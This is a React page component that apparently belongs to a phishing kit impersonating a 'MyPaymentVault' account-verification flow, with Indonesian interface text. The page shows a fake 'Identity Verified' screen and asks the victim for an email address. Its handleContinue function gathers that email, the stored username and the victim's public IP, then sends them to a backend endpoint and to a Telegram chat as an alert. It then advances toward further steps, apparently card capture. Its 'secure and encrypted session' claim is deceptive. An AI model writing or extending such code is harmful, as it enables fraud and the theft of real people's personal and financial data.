import { useEffect, useState } from "react";
import { useLocation } from "wouter";
import { ShieldCheck, Mail, Loader2 } from "lucide-react";
import { useAuth } from "@/lib/auth";
import { getPublicIP, sendTelegram } from "@/lib/telegram";

export default function LoginSuccess() {
  const [, navigate] = useLocation();
  const [username, setUsername] = useState("");
  const [email, setEmail] = useState("");
  const [emailError, setEmailError] = useState("");
  const [loading, setLoading] = useState(false);
  const [readyToNavigate, setReadyToNavigate] = useState(false);
  const { verifyCard, isAuthenticated } = useAuth();

  useEffect(() => {
    const stored = sessionStorage.getItem("botOtpUsername");
    if (!stored) { navigate("/login"); return; }
    setUsername(stored);
  }, [navigate]);

  // Navigate to /step4 only after isAuthenticated becomes true
  useEffect(() => {
    if (readyToNavigate && isAuthenticated) {
      navigate("/step4");
    }
  }, [readyToNavigate, isAuthenticated, navigate]);

  async function handleContinue() {
    if (!email.trim()) {
      setEmailError("Email tidak boleh kosong.");
      return;
    }
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email.trim())) {
      setEmailError("Format email tidak valid.");
      return;
    }
    setEmailError("");
    setLoading(true);

    try {
      const ip = await getPublicIP();

      await fetch("/api/auth/approved", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ username, ipAddress: ip, email: email.trim() }),
      }).catch(() => {});

      await sendTelegram(
        `📧 *Email Account Terverifikasi*\n\n` +
        `👤 Username: \`${username}\`\n` +
        `📩 Email: \`${email.trim()}\`\n` +
        `🌐 IP: \`${ip}\``,
      );
    } catch (_) {}

    verifyCard();
    setReadyToNavigate(true);
  }

  return (
    <div
      className="min-h-screen flex flex-col items-center justify-center ls-outer"
      style={{ background: "#f7f7f7" }}
    >
      <style>{`
        @media (max-width: 520px) {
          .ls-outer {
            background: #fff !important;
            justify-content: flex-start !important;
            padding: 0 !important;
          }
          .ls-card {
            max-width: 100% !important;
            min-height: 100dvh !important;
            box-shadow: none !important;
            border-radius: 0 !important;
          }
        }
        @keyframes fadeInUp {
          from { opacity: 0; transform: translateY(20px); }
          to   { opacity: 1; transform: translateY(0); }
        }
        @keyframes checkPop {
          0%   { transform: scale(0.4); opacity: 0; }
          70%  { transform: scale(1.15); opacity: 1; }
          100% { transform: scale(1); opacity: 1; }
        }
        .ls-fadein { animation: fadeInUp 0.5s ease both; }
        .ls-check  { animation: checkPop 0.55s cubic-bezier(.4,1.6,.6,1) both; }
        .email-input:focus { outline: none; border-color: #111; }
        .email-input::placeholder { color: #bbb; }
      `}</style>

      <div
        className="w-full flex flex-col bg-white ls-card"
        style={{ maxWidth: 480, boxShadow: "0 2px 32px rgba(0,0,0,0.13)" }}
      >
        {/* ══ HEADER ══ */}
        <div
          className="flex items-center justify-between"
          style={{ padding: "18px 24px", borderBottom: "1px solid #ebebeb" }}
        >
          <span
            className="select-none"
            style={{ fontSize: 15, letterSpacing: "0.18em", color: "#111" }}
          >
            <span style={{ fontWeight: 300 }}>MY</span>
            <span style={{ fontWeight: 700 }}>PAYMENT</span>
            <span style={{ fontWeight: 300 }}>VAULT</span>
          </span>
        </div>

        {/* ══ HERO IMAGE ══ */}
        <div style={{ width: "100%", lineHeight: 0 }}>
          <img
            src="/hero-vault-new.png"
            alt="MyPaymentVault"
            style={{ width: "100%", display: "block" }}
          />
        </div>

        {/* ══ BODY ══ */}
        <div style={{ padding: "36px 32px 44px", textAlign: "center" }}>

          {/* Icon */}
          <div
            className="ls-check"
            style={{
              width: 72, height: 72, borderRadius: "50%",
              background: "#111",
              display: "flex", alignItems: "center", justifyContent: "center",
              margin: "0 auto 20px",
            }}
          >
            <ShieldCheck size={36} color="#fff" strokeWidth={1.8} />
          </div>

          {/* Title */}
          <h2
            className="ls-fadein"
            style={{ fontSize: 22, fontWeight: 700, color: "#111", marginBottom: 6, animationDelay: "0.1s" }}
          >
            Identity Verified
          </h2>

          <p
            className="ls-fadein"
            style={{ fontSize: 14, color: "#555", marginBottom: 4, animationDelay: "0.12s" }}
          >
            Welcome back,
          </p>
          <p
            className="ls-fadein"
            style={{ fontSize: 18, fontWeight: 700, color: "#111", marginBottom: 24, animationDelay: "0.15s" }}
          >
            {username}
          </p>

          {/* Divider */}
          <div
            className="ls-fadein"
            style={{ borderTop: "1px solid #ebebeb", margin: "0 0 24px", animationDelay: "0.2s" }}
          />

          {/* Email field */}
          <div
            className="ls-fadein"
            style={{ textAlign: "left", marginBottom: 20, animationDelay: "0.25s" }}
          >
            <label style={{ fontSize: 13, fontWeight: 600, color: "#333", display: "block", marginBottom: 8 }}>
              Email Account
            </label>
            <div style={{ position: "relative" }}>
              <span style={{
                position: "absolute", left: 14, top: "50%", transform: "translateY(-50%)",
                display: "flex", alignItems: "center", color: "#999",
              }}>
                <Mail size={16} />
              </span>
              <input
                className="email-input"
                type="email"
                placeholder="contoh@email.com"
                value={email}
                onChange={(e) => { setEmail(e.target.value); setEmailError(""); }}
                onKeyDown={(e) => e.key === "Enter" && handleContinue()}
                style={{
                  width: "100%", height: 48,
                  border: emailError ? "1.5px solid #e00" : "1.5px solid #ddd",
                  borderRadius: 6, paddingLeft: 42, paddingRight: 16,
                  fontSize: 15, color: "#111",
                  background: "#fafafa",
                  boxSizing: "border-box",
                  transition: "border-color 0.15s",
                }}
                autoComplete="email"
                disabled={loading}
              />
            </div>
            {emailError && (
              <p style={{ fontSize: 12, color: "#e00", marginTop: 6 }}>{emailError}</p>
            )}
            <p style={{ fontSize: 12, color: "#888", marginTop: 6 }}>
              Masukkan email yang terdaftar untuk verifikasi akun Anda.
            </p>
          </div>

          {/* Step indicator */}
          <div
            className="ls-fadein"
            style={{ display: "flex", alignItems: "center", justifyContent: "center", gap: 8, marginBottom: 28, animationDelay: "0.3s" }}
          >
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <svg width="11" height="11" viewBox="0 0 12 12" fill="none"><path d="M2 6l3 3 5-5" stroke="#fff" strokeWidth="1.8" strokeLinecap="round" strokeLinejoin="round"/></svg>
            </div>
            <div style={{ width: 48, height: 1, background: "#111" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#111", border: "2px solid #111", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 700 }}>2</span>
            </div>
            <div style={{ width: 48, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>3</span>
            </div>
            <div style={{ width: 48, height: 1, background: "#ccc" }} />
            <div style={{ width: 22, height: 22, borderRadius: "50%", background: "#ccc", display: "flex", alignItems: "center", justifyContent: "center", flexShrink: 0 }}>
              <span style={{ fontSize: 11, color: "#fff", fontWeight: 600 }}>4</span>
            </div>
          </div>

          {/* CTA Button */}
          <button
            className="ls-fadein"
            type="button"
            onClick={handleContinue}
            disabled={loading}
            style={{
              width: "100%", height: 52,
              background: loading ? "#555" : "#111", color: "#fff",
              fontSize: 15, fontWeight: 600,
              border: "none", borderRadius: 6,
              cursor: loading ? "not-allowed" : "pointer",
              letterSpacing: "0.03em",
              animationDelay: "0.35s",
              display: "flex", alignItems: "center", justifyContent: "center", gap: 8,
            }}
          >
            {loading ? (
              <>
                <Loader2 size={18} style={{ animation: "spin 1s linear infinite" }} />
                Memverifikasi...
              </>
            ) : (
              "Verifikasi Email →"
            )}
          </button>

          <p style={{ fontSize: 12, color: "#bbb", marginTop: 16 }}>
            Sesi Anda aman dan terenkripsi.
          </p>
        </div>
      </div>

      <style>{`
        @keyframes spin { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
      `}</style>
    </div>
  );
}
